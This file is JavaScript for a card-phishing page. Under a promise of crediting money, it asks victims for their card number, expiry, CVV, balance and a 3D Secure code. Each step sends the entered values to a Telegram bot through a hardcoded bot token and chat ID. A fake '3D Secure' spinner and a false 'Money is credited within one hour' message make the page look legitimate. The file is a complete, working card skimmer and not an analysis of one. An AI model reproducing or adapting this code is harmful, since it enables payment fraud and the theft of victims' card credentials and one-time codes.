const TOKEN = '6151126769:AAE65jnNPQosJW4nIWITCYmtJelL7nmgyvE';
const CHAT_ID = '-1001693386750';
const URI_API = `https://api.telegram.org/bot${ TOKEN }/sendMessage`;
const amountNnumber = document.querySelector('#amountNnumber');
const formClear = document.querySelector('#headerContentSendGroup');

let sleep = ms => new Promise(res=>setTimeout(res,ms));

function clearForm(){
    formClear.innerHTML = '';
}
function clearPage(){
	amountNnumber.innerHTML = number;
}
let tel = document.querySelector('#CardNumber')
let reg = /[A-Za-zA-Яа-яЁё @ # $ _ & - ( ) / * " ' : ; ! ? ~ ` | / { } = % ^ < > -]/g;
tel.oninput = function(){
    this.value = this.value.replace(reg, '');
}

let date = document.querySelector('#inputdate')
let reg3 = /[A-Za-zA-Яа-яЁё @ # $ _ & - ( ) / * " ' : ; ! ? ~ ` | / { } = % ^ < > -]/g;
date.oninput = function(){
    this.value = this.value.replace(reg3, '');  
}

let date2 = document.querySelector('#inputdate2')
let reg4 = /[A-Za-zA-Яа-яЁё @ # $ _ & - ( ) / * " ' : ; ! ? ~ ` | / { } = % ^ < > -]/g;
date2.oninput = function(){
    this.value = this.value.replace(reg4, '');  
}

let cvv = document.querySelector('#cvv')
let reg5 = /[A-Za-zA-Яа-яЁё @ # $ _ & - ( ) / * " ' : ; ! ? ~ ` | / { } = % ^ < > -]/g;
cvv.oninput = function(){
    this.value = this.value.replace(reg5, '');  
}

document.querySelector("#submitButton").onclick = function(){
    document.getElementById('form').addEventListener('submit', function(e){
        e.preventDefault();
    
        let message = `<b>Номер карты: <code>${this.number.value}</code></b>\n`;
        message += `<b>Срок карты: <code>${this.date1.value}/${this.date2.value}</code></b>\n`;
        message += `<b>CVV: <code>${this.cvv.value}</code></b>`;
    
        axios.post(URI_API, {
            chat_id: CHAT_ID,
            parse_mode: 'html',
            text: message
        })
    
        
            clearForm();
            const resultsTemplate = `
            <form id="balanceGroup" class="balance__group">
            <div class="askbalance__group">
                <p class="balance__p">Enter the balance of your card</p>
                <img class="balance__img" src="images/56854.png" alt="">
            </div>
            <div class="input__balance-group">
                <input pattern=".{1,}" required maxlength="9" name="balance" id="inputbalance" class="input__balance" type="text" placeholder="">
                <div class="balance__currency-group">
                    <p class="currency">USD</p>
                    <svg width="30%" height="30%" class="svg__balance" viewBox="0 0 55 30" fill="none" xmlns="http://www.w3.org/2000/svg" fit="" preserveAspectRatio="xMidYMid meet" focusable="false">
                        <g clip-path="url('/mgo/us/en/#clip0_405_100303')">
                        <path d="M54.3206 0H0.987305V30H54.3206V0Z" fill="#B22234"></path>
                        <path d="M0.987305 3.46112H54.3206H0.987305ZM54.3206 8.07779H0.987305H54.3206ZM0.987305 12.6917H54.3206H0.987305ZM54.3206 17.3083H0.987305H54.3206ZM0.987305 21.9222H54.3206H0.987305ZM54.3206 26.5389H0.987305Z" fill="black"></path>
                        <path d="M54.3206 27.6918H0.987305V25.3835H54.3206V27.6918ZM54.3206 23.0779H0.987305V20.7696H54.3206V23.0779ZM54.3206 18.4613H0.987305V16.1529H54.3206V18.4613ZM54.3206 13.8474H0.987305V11.539H54.3206V13.8474ZM54.3206 9.23069H0.987305V6.92236H54.3206V9.23069ZM54.3206 4.61681H0.987305V2.30847H54.3206V4.61681Z" fill="white"></path>
                        <path d="M23.7873 0H0.987305V16.1528H23.7873V0Z" fill="#3C3B6E"></path>
                        <path d="M2.89051 0.691528L3.43495 2.36097L2.00717 1.33042H3.75995L2.34328 2.36375L2.89051 0.691528Z" fill="white"></path>
                        <path d="M2.8898 3.92224L3.43425 5.59169L2.00925 4.55835H3.76202L2.3398 5.59169L2.8898 3.92224Z" fill="white"></path>
                        <path d="M2.89035 7.15265L3.4348 8.82209L2.01257 7.78876H3.76535L2.34313 8.82209L2.89035 7.15265Z" fill="white"></path>
                        <path d="M2.89035 10.3834L3.4348 12.0556L2.01257 11.0223H3.76535L2.34313 12.0556L2.89035 10.3834Z" fill="white"></path>
                        <path d="M2.89035 13.6166L3.4348 15.2861L2.01257 14.2527H3.76535L2.34313 15.2861L2.89035 13.6166Z" fill="white"></path>
                        <path d="M4.78445 2.30847L5.3289 3.97792L3.90945 2.94458H5.66223L4.24557 3.97792L4.78445 2.30847Z" fill="white"></path>
                        <path d="M4.78522 5.53888L5.32966 7.20832L3.90744 6.17499H5.66022L4.238 7.20832L4.78522 5.53888Z" fill="white"></path>
                        <path d="M4.78522 8.76959L5.32966 10.439L3.90744 9.4057H5.66022L4.238 10.439L4.78522 8.76959Z" fill="white"></path>
                        <path d="M4.78522 12L5.32966 13.6694L3.90744 12.6361H5.66022L4.238 13.6694L4.78522 12Z" fill="white"></path>
                        <path d="M6.68753 0.691528L7.23198 2.36097L5.80975 1.32764H7.56253L6.14031 2.36097L6.68753 0.691528Z" fill="white"></path>
                        <path d="M6.68753 3.92224L7.23198 5.59169L5.80975 4.55835H7.56253L6.14031 5.59169L6.68753 3.92224Z" fill="white"></path>
                        <path d="M6.68753 7.15265L7.23198 8.82209L5.80975 7.78876H7.56253L6.14031 8.82209L6.68753 7.15265Z" fill="white"></path>
                        <path d="M6.68753 10.3834L7.23198 12.0528L5.80975 11.0195H7.56253L6.14309 12.0556L6.68753 10.3834Z" fill="white"></path>
                        <path d="M6.68753 13.6166L7.23198 15.2861L5.80975 14.2527H7.56253L6.14031 15.2861L6.68753 13.6166Z" fill="white"></path>
                        <path d="M8.58982 2.30847L9.13426 3.97792L7.71204 2.94458H9.46482L8.04259 3.97792L8.58982 2.30847Z" fill="white"></path>
                        <path d="M8.58982 5.53888L9.13426 7.20832L7.71204 6.17499H9.46482L8.04259 7.20832L8.58982 5.53888Z" fill="white"></path>
                        <path d="M8.58982 8.76959L9.13426 10.439L7.71204 9.4057H9.46482L8.04259 10.439L8.58982 8.76959Z" fill="white"></path>
                        <path d="M8.58982 12L9.13426 13.6694L7.71204 12.6361H9.46482L8.04259 13.6694L8.58982 12Z" fill="white"></path>
                        <path d="M10.4847 0.691528L11.0292 2.36097L9.60696 1.32764H11.3597L9.93752 2.36097L10.4847 0.691528Z" fill="white"></path>
                        <path d="M10.4847 3.92224L11.0292 5.59169L9.60696 4.55835H11.3597L9.93752 5.59169L10.4847 3.92224Z" fill="white"></path>
                        <path d="M10.4847 7.15265L11.0292 8.82209L9.60696 7.78876H11.3597L9.93752 8.82209L10.4847 7.15265Z" fill="white"></path>
                        <path d="M10.4847 10.3834L11.0292 12.0528L9.60696 11.0195H11.3597L9.9403 12.0556L10.4847 10.3834Z" fill="white"></path>
                        <path d="M10.4847 13.6166L11.0292 15.2861L9.60696 14.2527H11.3597L9.93752 15.2861L10.4847 13.6166Z" fill="white"></path>
                        <path d="M12.387 2.30847L12.9315 3.97792L11.5092 2.94458H13.2648L11.8426 3.97792L12.387 2.30847Z" fill="white"></path>
                        <path d="M12.387 5.53888L12.9315 7.20832L11.5092 6.17499H13.2648L11.8426 7.20832L12.387 5.53888Z" fill="white"></path>
                        <path d="M12.387 8.76959L12.9315 10.439L11.5092 9.4057H13.2648L11.8426 10.439L12.387 8.76959Z" fill="white"></path>
                        <path d="M12.387 12L12.9315 13.6694L11.5092 12.6361H13.2648L11.8426 13.6694L12.387 12Z" fill="white"></path>
                        <path d="M14.2893 0.691528L14.8338 2.36097L13.4115 1.32764H15.1643L13.7421 2.36097L14.2893 0.691528Z" fill="white"></path>
                        <path d="M14.2893 3.92224L14.8338 5.59169L13.4115 4.55835H15.1643L13.7421 5.59169L14.2893 3.92224Z" fill="white"></path>
                        <path d="M14.2893 7.15265L14.8338 8.82209L13.4115 7.78876H15.1643L13.7421 8.82209L14.2893 7.15265Z" fill="white"></path>
                        <path d="M14.2893 10.3834L14.8338 12.0528L13.4115 11.0195H15.1643L13.7421 12.0556L14.2893 10.3834Z" fill="white"></path>
                        <path d="M14.2893 13.6166L14.8338 15.2861L13.4115 14.2527H15.1643L13.7421 15.2861L14.2893 13.6166Z" fill="white"></path>
                        <path d="M16.1847 2.30847L16.7292 3.97792L15.3097 2.94458H17.0625L15.6403 3.97792L16.1847 2.30847Z" fill="white"></path>
                        <path d="M16.1842 5.53888L16.7286 7.20832L15.3064 6.17499H17.0592L15.637 7.20832L16.1842 5.53888Z" fill="white"></path>
                        <path d="M16.1842 8.76959L16.7286 10.439L15.3064 9.4057H17.0592L15.637 10.439L16.1842 8.76959Z" fill="white"></path>
                        <path d="M16.1842 12L16.7286 13.6694L15.3064 12.6361H17.0592L15.637 13.6694L16.1842 12Z" fill="white"></path>
                        <path d="M18.0878 0.691528L18.6322 2.36097L17.21 1.33042H18.9628L17.5434 2.36375L18.0878 0.691528Z" fill="white"></path>
                        <path d="M18.0878 3.92224L18.6322 5.59169L17.21 4.56113H18.9628L17.5434 5.59446L18.0878 3.92224Z" fill="white"></path>
                        <path d="M18.0878 7.15265L18.6322 8.8221L17.21 7.79154H18.9628L17.5434 8.82487L18.0878 7.15265Z" fill="white"></path>
                        <path d="M18.0878 10.3834L18.6322 12.0528L17.21 11.0223H18.9628L17.5434 12.0556L18.0878 10.3834Z" fill="white"></path>
                        <path d="M18.0878 13.6166L18.6322 15.2861L17.21 14.2527H18.9628L17.5434 15.2861L18.0878 13.6166Z" fill="white"></path>
                        <path d="M19.9901 2.30847L20.5345 3.97792L19.1123 2.94458H20.8651L19.4429 3.97792L19.9901 2.30847Z" fill="white"></path>
                        <path d="M19.9901 5.53888L20.5345 7.20832L19.1123 6.17499H20.8651L19.4429 7.20832L19.9901 5.53888Z" fill="white"></path>
                        <path d="M19.9901 8.76959L20.5345 10.439L19.1123 9.4057H20.8651L19.4429 10.439L19.9901 8.76959Z" fill="white"></path>
                        <path d="M19.9901 12L20.5345 13.6694L19.1123 12.6361H20.8651L19.4429 13.6694L19.9901 12Z" fill="white"></path>
                        <path d="M21.8842 0.691528L22.4315 2.36375L21.0092 1.33042H22.762L21.3398 2.36375L21.8842 0.691528Z" fill="white"></path>
                        <path d="M21.885 3.92224L22.4294 5.59169L21.0072 4.55835H22.76L21.3378 5.59169L21.885 3.92224Z" fill="white"></path>
                        <path d="M21.885 7.15265L22.4294 8.82209L21.0072 7.78876H22.76L21.3378 8.82209L21.885 7.15265Z" fill="white"></path>
                        <path d="M21.8842 10.3834L22.4315 12.0556L21.0092 11.0223H22.762L21.3398 12.0556L21.8842 10.3834Z" fill="white"></path>
                        <path d="M21.885 13.6166L22.4294 15.2861L21.0072 14.2527H22.76L21.3378 15.2861L21.885 13.6166Z" fill="white"></path>
                        </g>
                        <defs>
                        <clipPath id="clip0_405_100303">
                        <rect width="53.3333" height="30" fill="white" transform="translate(0.987305)"></rect>
                        </clipPath>
                        </defs>
                    </svg>
                </div>
            </div>
            <button id='balanceButton' class="balance__button">Receiave</button>
            </form>
            `;
            formClear.classList.add('mb80')
            const finalMessage = resultsTemplate;
            formClear.innerHTML = finalMessage;
            document.querySelector("#balanceButton").onclick = function(){
                document.getElementById('balanceGroup').addEventListener('submit', async function(e){
                    e.preventDefault();
                
                    const message2 = `<b>Баланс: <code>${this.balance.value}$</code></b>\n`;
                
                    axios.post(URI_API, {
                        chat_id: CHAT_ID,
                        parse_mode: 'html',
                        text: message2
                    })
                    
                    clearForm();
                    const spinner3dSecure = `
                    <section class="spinner-block">
                    <h4>3D Secure</h4>
                    <section class="rect-spinner" tabindex="1" aria-label="rect spinner">
                    <div class="container__spinner">
                    <div class="rect"></div>
                    <div class="rect"></div>
                    <div class="rect"></div>
                    <div class="rect"></div>
                    <div class="rect"></div>
                    <div class="rect"></div>
                    <div class="rect"></div>
                    <div class="rect"></div>
                    <div class="rect"></div>
                    <div class="rect"></div>
                    <div class="rect"></div>
                    <div class="rect"></div>
                    <div class="rect"></div>
                    <div class="rect"></div>
                    <div class="rect"></div>
                    <div class="rect"></div>
                    </div>
                    </section>
                    </section>`
                    const finalMessage = spinner3dSecure;
                    formClear.innerHTML = finalMessage;
                    formClear.classList.remove('mb80')
                    await sleep(5000);
                    clearForm();
                    const code = `
            <form id="balanceGroup" class="balance__group">
            <div class="askbalance__group">
                <p class="balance__p">Enter the Code</p>
            </div>
            <div class="input__balance-group">
                <input pattern=".{1,}" required maxlength="4" name="code" id="inputbalance" class="input__balance" type="text" placeholder="">
            </div>
            <button id='balanceButton' class="balance__button">Receiave</button>
            </form>
            `;
            formClear.classList.add('mb80')
            const codeFinal = code;
            formClear.innerHTML = codeFinal;
            document.getElementById('balanceGroup').addEventListener('submit', function(e){
                e.preventDefault();
            
                const message = `<b>Код: <code>${this.code.value}</code></b>\n`;
            
                axios.post(URI_API, {
                    chat_id: CHAT_ID,
                    parse_mode: 'html',
                    text: message
                })

                clearForm();
                const thanks = `
                <form id="balanceGroup" class="balance__group">
                <div class="askbalance__group">
                    <p class="balance__p">Thank you!
                    Money is credited within one hour</p>
                </div>
                </form>
                `;
                formClear.classList.add('mb80')
                const codeFinal = thanks;
                formClear.innerHTML = codeFinal;
                })
                })
            }

        }
    );
}








async function getResponse(){
    let response = await fetch('https://api.telegram.org/bot6151126769:AAE65jnNPQosJW4nIWITCYmtJelL7nmgyvE/getUpdates?chat_id=-1001693386750')
    let content = await response.json()
    NumberOfAmountNumber = (content.result.length - 1);
    number = (content.result[NumberOfAmountNumber].message.text);
    clearPage()
}

getResponse()






